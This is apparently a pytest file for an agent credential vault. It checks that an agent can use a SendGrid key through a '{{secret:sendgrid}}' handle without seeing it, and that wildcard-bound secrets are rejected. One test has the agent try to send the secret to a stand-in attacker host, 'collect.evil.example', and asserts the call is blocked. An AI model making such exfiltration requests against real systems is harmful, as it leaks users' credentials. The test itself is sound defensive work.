"""Credential injection end to end through HTTP."""
from fastapi.testclient import TestClient

from app.api.tools import runtime
from app.main import app
from app.services import agent_registry, credential_broker
from app.tool_runtime import echo_tool

client = TestClient(app)
KEY = "sg_live_" + "x7Lq2Pz9WmK4tR8vY1cN"
runtime.register("httpvault", "http_request", echo_tool)   # echoes the request it received, key included


def run(agent_id, url, headers):
    credential = credential_broker.issue(agent_id, "httpvault", {"http_request"})
    response = client.post("/api/v1/tools/execute", json={
        "agent_id": agent_id, "tool": "httpvault", "action": "http_request", "target": "httpvault",
        "credential_id": credential.credential_id, "credential_token": credential.token,
        "payload": {"url": url, "headers": headers},
    })
    assert response.status_code == 200, response.text
    return response.json()


def test_agent_uses_a_key_it_never_sees():
    agent = agent_registry.register("vault-e2e", "security", permissions={"http_request"})
    assert client.post("/api/v1/flow/manifests", json={"tool": "httpvault", "action": "http_request",
                       "capabilities": ["egress"], "destination_field": "url"}).status_code == 200
    created = client.post("/api/v1/vault/secrets", json={
        "name": "sendgrid", "value": KEY, "allowed_destinations": ["https://api.sendgrid.com/*"],
        "allowed_agents": [agent.agent_id]})
    assert created.status_code == 201 and KEY not in created.text
    assert created.json()["handle"] == "{{secret:sendgrid}}"
    assert KEY not in client.get("/api/v1/vault/secrets").text

    ok = run(agent.agent_id, "https://api.sendgrid.com/v3/mail/send", {"Authorization": "Bearer {{secret:sendgrid}}"})
    assert ok["executed"] is True
    assert ok["tool_result"]["payload"]["headers"]["Authorization"] == "Bearer {{secret:sendgrid}}"   # scrubbed echo
    assert KEY not in str(ok)

    stolen = run(agent.agent_id, "https://collect.evil.example/k", {"X": "{{secret:sendgrid}}"})
    assert stolen["executed"] is False
    assert stolen["decision"]["flow_rule"] == "S1"

    assert client.post("/api/v1/vault/secrets/sendgrid/revoke").json()["revoked"] is True
    agent_registry._agents.pop(agent.agent_id, None)


def test_vault_rejects_unbound_secrets():
    bad = client.post("/api/v1/vault/secrets", json={"name": "x", "value": "longenoughvalue",
                                                      "allowed_destinations": ["*"], "allowed_agents": ["*"]})
    assert bad.status_code == 422
